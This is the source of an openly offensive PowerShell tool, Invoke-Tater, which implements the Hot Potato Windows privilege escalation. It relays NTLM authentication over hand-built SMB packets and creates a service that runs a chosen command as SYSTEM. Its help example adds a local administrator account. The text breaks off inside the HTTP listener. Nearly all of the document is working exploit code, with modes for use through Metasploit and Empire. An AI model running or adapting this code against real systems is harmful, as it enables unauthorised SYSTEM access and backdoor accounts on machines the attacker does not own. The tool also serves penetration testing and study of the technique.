Function Invoke-Tater
{
<#
.SYNOPSIS
Invoke-Tater is a PowerShell implementation of the Hot Potato Windows Privilege Escalation.

.DESCRIPTION
Invoke-Tater is a PowerShell implementation of the Hot Potato Windows Privilege Escalation with functionality similiar to Potato.exe.

.PARAMETER IP
Specify a specific local IP address.

.PARAMETER Command
Command to execute as SYSTEM on the localhost.

.PARAMETER RunTime
(Integer) Set the run time duration in minutes.

.PARAMETER ConsoleOutput
Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to ensure that it doesn't hang the shell.

.PARAMETER FileOutput
Default = Disabled: (Y/N) Enable/Disable real time file output.

.PARAMETER StatusOutput
Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.

.PARAMETER OutputStreamOnly
Default = Disabled: Enable/Disable forcing all output to the standard output stream. This can be helpful if running Inveigh through a shell that does not return other output streams.
Note that you will not see the various yellow warning messages if enabled.

.PARAMETER ShowHelp
Default = Enabled: (Y/N) Enable/Disable the help messages at startup.

.PARAMETER Tool
Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire  

.EXAMPLE
Invoke-Tater -SMBRelayCommand "net user Dave Winter2016 /add && net localgroup administrators Dave /add"

.LINK
https://github.com/Kevin-Robertson/Tater

#>

# Default parameter values can be modified in this section 
param
( 
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ConsoleOutput="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$StatusOutput="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$OutputStreamOnly="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ShowHelp="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$SMBRelayAutoDisable="Y",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][string]$Tool="0",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [IPAddress]$_ })][string]$IP="",
    [parameter(Mandatory=$false)][int]$RunTime = "",
    [parameter(Mandatory=$true)][string]$Command = "", 
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if ($invalid_parameter)
{
    throw "$($invalid_parameter) is not a valid parameter."
}

if(!$IP)
{ 
    $IP = (Test-Connection 127.0.0.1 -count 1 | select -ExpandProperty Ipv4Address)
}

if(!$Command)
{
    Throw "You must specify an -Command if enabling -SMBRelay"
}

if(!$tater)
{
    $global:tater = [hashtable]::Synchronized(@{})
}

if($tater.running)
{
    Throw "Invoke-Tater is already running, use Stop-Tater"
}

if(!$tater.running)
{
    $tater.console_queue = New-Object System.Collections.ArrayList
    $tater.status_queue = New-Object System.Collections.ArrayList
    $tater.console_output = $true
    $tater.console_input = $true
}

$tater.running = $true
$tater.SMB_relay_active_step = 0
$tater.SMB_relay = $true

if($StatusOutput -eq 'y')
{
    $tater.status_output = $true
}
else
{
    $tater.status_output = $false
}

if($OutputStreamOnly -eq 'y')
{
    $tater.output_stream_only = $true
}
else
{
    $tater.output_stream_only = $false
}

if($Tool -eq 1) # Metasploit Interactive Powershell
{
    $tater.tool = 1
    $tater.output_stream_only = $true
    $tater.newline = ""
    $ConsoleOutput = "N"
}
elseif($Tool -eq 2) # PowerShell Empire
{
    $tater.tool = 2
    $tater.output_stream_only = $true
    $tater.console_input = $false
    $tater.newline = "`n"
    $ConsoleOutput = "Y"
    $ShowHelp = "N"
}
else
{
    $tater.tool = 0
    $tater.newline = ""
}

# Write startup messages
$tater.status_queue.add("$(Get-Date -format 's') - Tater (Hot Potato�Windows Privilege Escalation) started")|Out-Null
$tater.status_queue.add("Local IP Address = $IP") |Out-Null

if($ConsoleOutput -eq 'y')
{
    $tater.status_queue.add("Real Time Console Output Enabled")|Out-Null
    $tater.console_output = $true
}
else
{
    if($tater.tool -eq 1)
    {
        $tater.status_queue.add("Real Time Console Output Disabled Due To External Tool Selection")|Out-Null
    }
    else
    {
        $tater.status_queue.add("Real Time Console Output Disabled")|Out-Null
    }
}
if($RunTime -eq '1')
{
    $tater.status_queue.add("Run Time = $RunTime Minute")|Out-Null
}
elseif($RunTime -gt 1)
{
    $tater.status_queue.add("Run Time = $RunTime Minutes")|Out-Null
}

if($ShowHelp -eq 'y')
{
    $tater.status_queue.add("Run Stop-Tater to stop Tater early")|Out-Null
        
    if($tater.console_output)
    {
        $tater.status_queue.add("Use Get-Command -Noun Tater* to show available functions")|Out-Null
        $tater.status_queue.add("Press any key to stop real time console output")|Out-Null
        $tater.status_queue.add("")|Out-Null
    }
}

if($tater.status_output)
{
    while($tater.status_queue.Count -gt 0)
    {
        if($tater.output_stream_only)
        {
            write-output($tater.status_queue[0] + $tater.newline)
            $tater.status_queue.RemoveRange(0,1)
        }
        else
        {
            switch ($tater.status_queue[0])
            {
                "Run Stop-Tater to stop Tater"
                {
                    write-warning($tater.status_queue[0])
                    $tater.status_queue.RemoveRange(0,1)
                }
                default
                {
                    write-output($tater.status_queue[0])
                    $tater.status_queue.RemoveRange(0,1)
                }
            }
        }
    }
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() |select -expand id
$process_ID = [BitConverter]::ToString([BitConverter]::GetBytes($process_ID))
$process_ID = $process_ID -replace "-00-00",""
[Byte[]]$tater.process_ID_bytes = $process_ID.Split("-") | FOREACH{[CHAR][CONVERT]::toint16($_,16)}

# Begin ScriptBlocks

# Shared Basic Functions ScriptBlock
$shared_basic_functions_scriptblock =
{
    Function DataToUInt16($field)
    {
	   [Array]::Reverse($field)
	   return [BitConverter]::ToUInt16($field,0)
    }

    Function DataToUInt32($field)
    {
	   [Array]::Reverse($field)
	   return [BitConverter]::ToUInt32($field,0)
    }

    Function DataLength
    {
        param ([int]$length_start,[byte[]]$string_extract_data)

        $string_length = [System.BitConverter]::ToInt16($string_extract_data[$length_start..($length_start + 1)],0)
        return $string_length
    }

    Function DataToString
    {
        param ([int]$string_length,[int]$string2_length,[int]$string3_length,[int]$string_start,[byte[]]$string_extract_data)

        $string_data = [System.BitConverter]::ToString($string_extract_data[($string_start+$string2_length+$string3_length)..($string_start+$string_length+$string2_length+$string3_length-1)])
        $string_data = $string_data -replace "-00",""
        $string_data = $string_data.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
        return $string_extract
    }
}

# SMB NTLM Functions ScriptBlock - function for parsing NTLM challenge/response
$SMB_NTLM_functions_scriptblock =
{
    Function SMBNTLMChallenge
    {
        param ([byte[]]$payload_bytes)

        $payload = [System.BitConverter]::ToString($payload_bytes)
        $payload = $payload -replace "-",""
        $NTLM_index = $payload.IndexOf("4E544C4D53535000")

        if($payload.SubString(($NTLM_index + 16),8) -eq "02000000")
        {
            $NTLM_challenge = $payload.SubString(($NTLM_index + 48),16)
        }

        return $NTLM_challenge
    }
}

# SMB Relay Challenge ScriptBlock - gathers NTLM server challenge from relay target
$SMB_relay_challenge_scriptblock =
{
    Function SMBRelayChallenge
    {
        param ($SMB_relay_socket,$HTTP_request_bytes)

        if ($SMB_relay_socket)
        {
            $SMB_relay_challenge_stream = $SMB_relay_socket.GetStream()
        }
        
        $SMB_relay_challenge_bytes = New-Object System.Byte[] 1024

        $i = 0
        
        :SMB_relay_challenge_loop while ($i -lt 2)
        {
            switch ($i)
            {
                0 {
                    [Byte[]] $SMB_relay_challenge_send = (0x00,0x00,0x00,0x2f,0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x01,0x48)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                        + $tater.process_ID_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x02,0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00)
                }
                
                1 { 
                    $SMB_length_1 = '0x{0:X2}' -f ($HTTP_request_bytes.length + 32)
                    $SMB_length_2 = '0x{0:X2}' -f ($HTTP_request_bytes.length + 22)
                    $SMB_length_3 = '0x{0:X2}' -f ($HTTP_request_bytes.length + 2)
                    $SMB_NTLMSSP_length = '0x{0:X2}' -f ($HTTP_request_bytes.length)
                    $SMB_blob_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length))
                    $SMB_blob_length = $SMB_blob_length -replace "-00-00",""
                    $SMB_blob_length = $SMB_blob_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                    $SMB_byte_count = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 28))
                    $SMB_byte_count = $SMB_byte_count -replace "-00-00",""
                    $SMB_byte_count = $SMB_byte_count.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                    $SMB_netbios_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 87))
                    $SMB_netbios_length = $SMB_netbios_length -replace "-00-00",""
                    $SMB_netbios_length = $SMB_netbios_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                    [array]::Reverse($SMB_netbios_length)
                    
                    [Byte[]] $SMB_relay_challenge_send = (0x00,0x00)`
                        + $SMB_netbios_length`
                        + (0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x03,0xc8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                        + $tater.process_ID_bytes`
                        + (0x00,0x00,0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,0x01,0x00,0x00,0x00,0x00,0x00)`
                        + $SMB_blob_length`
                        + (0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80)`
                        + $SMB_byte_count`
                        + $HTTP_request_bytes`
                        + (0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,0x00,0x00)`
                        + (0x6a,0x00,0x43,0x00,0x49,0x00,0x46,0x00,0x53,0x00,0x00,0x00)
                }
            }

            $SMB_relay_challenge_stream.Write($SMB_relay_challenge_send, 0, $SMB_relay_challenge_send.length)
            $SMB_relay_challenge_stream.Flush()
    
            $SMB_relay_challenge_stream.Read($SMB_relay_challenge_bytes, 0, $SMB_relay_challenge_bytes.length)

            $i++
        }
        
        return $SMB_relay_challenge_bytes
    }
}

# SMB Relay Response ScriptBlock - sends NTLM reponse to relay target
$SMB_relay_response_scriptblock =
{
    Function SMBRelayResponse
    {
        param ($SMB_relay_socket,$HTTP_request_bytes,$SMB_user_ID)
    
        $SMB_relay_response_bytes = New-Object System.Byte[] 1024

        if ($SMB_relay_socket)
        {
            $SMB_relay_response_stream = $SMB_relay_socket.GetStream()
        }
        
        $SMB_blob_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length))
        $SMB_blob_length = $SMB_blob_length -replace "-00-00",""
        $SMB_blob_length = $SMB_blob_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $SMB_byte_count = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 28))
        $SMB_byte_count = $SMB_byte_count -replace "-00-00",""
        $SMB_byte_count = $SMB_byte_count.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $SMB_netbios_length = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_request_bytes.length + 88))
        $SMB_netbios_length = $SMB_netbios_length -replace "-00-00",""
        $SMB_netbios_length = $SMB_netbios_length.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        [array]::Reverse($SMB_netbios_length)
        $j = 0

        :SMB_relay_response_loop while ($j -lt 1)
        {
            [Byte[]] $SMB_relay_response_send = (0x00,0x00)`
                + $SMB_netbios_length`
                + (0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x03,0xc8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                + $tater.process_ID_bytes`
                + $SMB_user_ID`
                + (0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,0x01,0x00,0x00,0x00,0x00,0x00)`
                + $SMB_blob_length`
                + (0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80)`
                + $SMB_byte_count`
                + $HTTP_request_bytes`
                + (0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,0x00,0x00)`
                + (0x6a,0x00,0x43,0x00,0x49,0x00,0x46,0x00,0x53,0x00,0x00,0x00)

            $SMB_relay_response_stream.write($SMB_relay_response_send, 0, $SMB_relay_response_send.length)
        	$SMB_relay_response_stream.Flush()

            $SMB_relay_response_stream.Read($SMB_relay_response_bytes, 0, $SMB_relay_response_bytes.length)
            
            $tater.SMB_relay_active_step = 2
            
            $j++
        
        }
        return $SMB_relay_response_bytes
    }
}

# SMB Relay Execute ScriptBlock - executes command within authenticated SMB session
$SMB_relay_execute_scriptblock =
{
    Function SMBRelayExecute
    {
        param ($SMB_relay_socket,$SMB_user_ID)
    
        if ($SMB_relay_socket)
        {
            $SMB_relay_execute_stream = $SMB_relay_socket.GetStream()
        }

        $SMB_relay_failed = $false
        $SMB_relay_execute_bytes = New-Object System.Byte[] 1024
        $SMB_service_random = [String]::Join("00-", (1..20 | % {"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))
        $SMB_service = $SMB_service_random -replace "-00",""
        $SMB_service = $SMB_service.Substring(0,$SMB_service.Length-1)
        $SMB_service = $SMB_service.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)
        $SMB_service_random += '00-00-00'
        [Byte[]]$SMB_service_bytes = $SMB_service_random.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $SMB_referent_ID_bytes = [String](1..4 | % {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $SMB_referent_ID_bytes = $SMB_referent_ID_bytes.Split(" ") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $Command = "%COMSPEC% /C `"" + $Command + "`""
        [System.Text.Encoding]::ASCII.GetBytes($Command) | % { $SMB_relay_command += "{0:X2}-00-" -f $_ }

        if([bool]($Command.length%2))
        {
            $SMB_relay_command += '00-00'
        }
        else
        {
            $SMB_relay_command += '00-00-00-00'
        }    
        
        [Byte[]]$SMB_relay_command_bytes = $SMB_relay_command.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $SMB_service_data_length_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length + $SMB_service_bytes.length + 237)
        $SMB_service_data_length_bytes = $SMB_service_data_length_bytes[2..0]
        $SMB_service_byte_count_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length + $SMB_service_bytes.length + 237 - 63)
        $SMB_service_byte_count_bytes = $SMB_service_byte_count_bytes[0..1]   
        $SMB_relay_command_length_bytes = [BitConverter]::GetBytes($SMB_relay_command_bytes.length / 2)

        $k = 0

        :SMB_relay_execute_loop while ($k -lt 12)
        {
            switch ($k)
            {
            
                0 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x45,0xff,0x53,0x4d,0x42,0x75,0x00,0x00,0x00,0x00,0x18,0x01,0x48)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                        + $tater.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x00,0x00,0x04,0xff,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x1a,0x00,0x00,0x5c,0x5c,0x31,0x30,0x2e,0x31)`
                        + (0x30,0x2e,0x32,0x2e,0x31,0x30,0x32,0x5c,0x49,0x50,0x43,0x24,0x00,0x3f,0x3f,0x3f,0x3f,0x3f,0x00)
                }
                  
                1 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x5b,0xff,0x53,0x4d,0x42,0xa2,0x00,0x00,0x00,0x00,0x18,0x02,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $tater.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x03,0x00,0x18,0xff,0x00,0x00,0x00,0x00,0x07,0x00,0x16,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                        + (0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x01,0x00,0x00,0x00)`
                        + (0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x08,0x00,0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00)
                }
                
                2 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x87,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $tater.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x04,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x48,0x00)`
                        + (0x00,0x00,0x48,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x05,0x00,0x0b,0x03,0x10,0x00,0x00,0x00,0x48)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xd0,0x16,0xd0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00)`
                        + (0x01,0x00,0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03,0x02,0x00,0x00)`
                        + (0x00,0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60,0x02,0x00,0x00,0x00)
                        
                        $SMB_multiplex_id = (0x05)
                }
               
                3 { 
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                4 {
                    [Byte[]] $SMB_relay_execute_send = (0x00,0x00,0x00,0x9b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $tater.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x06,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x50)`
                        + (0x00,0x00,0x00,0x5c,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x5c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
                        + (0x00,0x5c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x38,0x00,0x00,0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x03)`
                        + (0x00,0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00)`
                        + $SMB_service_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x3f,0x00,0x0f,0x00)
                        
                        $SMB_multiplex_id = (0x07)
                }
                
                5 {  
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                6 {
                    [Byte[]]$SMB_relay_execute_send = [ARRAY](0x00)`
                        + $SMB_service_data_length_bytes`
                        + (0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $tater.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x08,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00)`
                        + $SMB_service_byte_count_bytes`
                        + (0x00,0x00)`
                        + $SMB_service_byte_count_bytes`
                        + (0x3f,0x00,0x00,0x00,0x00,0x00)`
                        + $SMB_service_byte_count_bytes`
                        + (0x05,0x00,0x00,0x03,0x10)`
                        + (0x00,0x00,0x00)`
                        + $SMB_service_byte_count_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,0x00)`
                        + $SMB_context_handler`
                        + (0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00)`
                        + $SMB_service_bytes`
                        + (0x00,0x00)`
                        + $SMB_referent_ID_bytes`
                        + (0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00)`
                        + $SMB_service_bytes`
                        + (0x00,0x00,0xff,0x01,0x0f,0x00,0x10,0x01,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                        + $SMB_relay_command_length_bytes`
                        + (0x00,0x00,0x00,0x00)`
                        + $SMB_relay_command_length_bytes`
                        + $SMB_relay_command_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
                        
                        $SMB_multiplex_id = (0x09)
                }

                7 {
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }

                
                8 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x73,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $tater.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x0a,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x34)`
                        + (0x00,0x00,0x00,0x34,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x34,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
                        + (0x00,0x34,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,0x00,0x00,0x00,0x13,0x00)`
                        + $SMB_context_handler`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
                }
                
                9 {
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                10 { 
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x6b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $tater.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x0b,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x0b,0x01,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x2c)`
                        + (0x00,0x00,0x00,0x2c,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x2c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
                        + (0x00,0x2c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0x00,0x00,0x00,0x00,0x00,0x02,0x00)`
                        + $SMB_context_handler
                }
                11 {
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
            }
            
            $SMB_relay_execute_stream.write($SMB_relay_execute_send, 0, $SMB_relay_execute_send.length)
            $SMB_relay_execute_stream.Flush()
            
            if ($k -eq 5) 
            {
                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes, 0, $SMB_relay_execute_bytes.length)
                $SMB_context_handler = $SMB_relay_execute_bytes[88..107]

                if(([System.BitConverter]::ToString($SMB_relay_execute_bytes[108..111]) -eq '00-00-00-00') -and ([System.BitConverter]::ToString($SMB_context_handler) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00'))
                {
                    #$tater.console_queue.add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $SMBRelayTarget")
                }
                elseif([System.BitConverter]::ToString($SMB_relay_execute_bytes[108..111]) -eq '05-00-00-00')
                {
                    $tater.console_queue.add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator on $SMBRelayTarget")
                    $SMB_relay_failed = $true
                }
                else
                {
                    $SMB_relay_failed = $true
                }

            }
            elseif (($k -eq 7) -or ($k -eq 9) -or ($k -eq 11))
            {
                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes, 0, $SMB_relay_execute_bytes.length)

                switch($k)
                {
                    7 {
                        $SMB_context_handler = $SMB_relay_execute_bytes[92..111]
                        $SMB_relay_execute_error_message = "Service creation fault context mismatch"
                    }
                    11 {
                        $SMB_relay_execute_error_message = "Service start fault context mismatch"
                    }
                    13 {
                        $SMB_relay_execute_error_message = "Service deletion fault context mismatch"
                    }
                }
                
                if([System.BitConverter]::ToString($SMB_context_handler[0..3]) -ne '00-00-00-00')
                {
                    $SMB_relay_failed = $true
                }

                if([System.BitConverter]::ToString($SMB_relay_execute_bytes[88..91]) -eq '1a-00-00-1c')
                {
                    $tater.console_queue.add("$SMB_relay_execute_error_message service on $SMBRelayTarget")
                    $SMB_relay_failed = $true
                }
            }        
            else
            {
                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes, 0, $SMB_relay_execute_bytes.length)    
            }
            
            if((!$SMB_relay_failed) -and ($k -eq 7))
            {
                $tater.console_queue.add("$(Get-Date -format 's') - SMB relay service $SMB_service created on $SMBRelayTarget")
            }
            elseif((!$SMB_relay_failed) -and ($k -eq 9))
            {
                $tater.console_queue.add("$(Get-Date -format 's') - SMB relay command likely executed on $SMBRelayTarget")
                $tater.SMB_relay = $false
                $tater.console_queue.add("$(Get-Date -format 's') - SMB relay disabled due to success")
            }
            elseif((!$SMB_relay_failed) -and ($k -eq 11))
            {
                $tater.console_queue.add("$(Get-Date -format 's') - SMB relay service $SMB_service deleted on $SMBRelayTarget")
                }   
            
            [Byte[]]$SMB_relay_execute_ReadAndRequest = (0x00,0x00,0x00,0x37,0xff,0x53,0x4d,0x42,0x2e,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                + $tater.process_ID_bytes`
                + $SMB_user_ID`
                + $SMB_multiplex_ID`
                + (0x00,0x0a,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x58,0x02,0x58,0x02,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00)
            
            if($SMB_relay_failed)
            {
                $tater.console_queue.add("$(Get-Date -format 's') - SMB relay failed on $SMBRelayTarget")
                BREAK SMB_relay_execute_loop
            }

            $k++
        }
        
        $tater.SMB_relay_active_step = 0
        
        $SMB_relay_socket.Close()
        $tater.SMBRelay_success = $True
    }
}

# HTTP/HTTPS Server ScriptBlock - HTTP/HTTPS listener
$HTTP_scriptblock = 
{ 
    param ($Command)

    Function NTLMChallengeBase64
    {

        $HTTP_timestamp = Get-Date
        $HTTP_timestamp = $HTTP_timestamp.ToFileTime()
        $HTTP_timestamp = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_timestamp))
        $HTTP_timestamp = $HTTP_timestamp.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}

        [byte[]]$HTTP_NTLM_bytes = (0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,0x00,0x00,0x00,0x05,0xc2,0x89,0xa2)`
            + $HTTP_challenge_bytes`
            + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00)`
            + (0x02,0x00,0x06,0x00,0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00)`
            + (0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,0x00,0x68,0x00,0x6f,0x00)`
            + (0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00)`
            + (0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00)`
            + $HTTP_timestamp`
            + (0x00,0x00,0x00,0x00,0x0a,0x0a)

        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
